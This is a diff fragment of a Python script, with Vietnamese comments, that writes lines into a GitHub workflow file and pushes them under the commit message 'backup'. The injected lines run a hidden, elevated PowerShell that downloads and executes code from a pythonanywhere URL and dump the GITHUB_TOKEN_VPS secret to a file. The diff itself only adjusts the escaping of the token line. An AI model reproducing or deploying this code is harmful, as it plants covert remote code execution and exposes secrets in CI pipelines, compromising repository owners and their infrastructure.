@@ -5,7 +5,7 @@ import subprocess
 
 # Nội dung muốn inject
 code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""
-token_lovee = """        $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\a\vpstoken.txt"\n"""
+token_lovee = """        $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\\a\\vpstoken.txt"\n"""
 # 1. Tìm thư mục theo pattern
 pattern = r"D:\a\vps-project-*\vps-project-*"
 matches = glob.glob(pattern)
@@ -50,6 +50,7 @@ subprocess.run(["git", "add", workflow_file])
 subprocess.run(["git", "commit", "-m", "backup"])
 subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
+
 
 
 
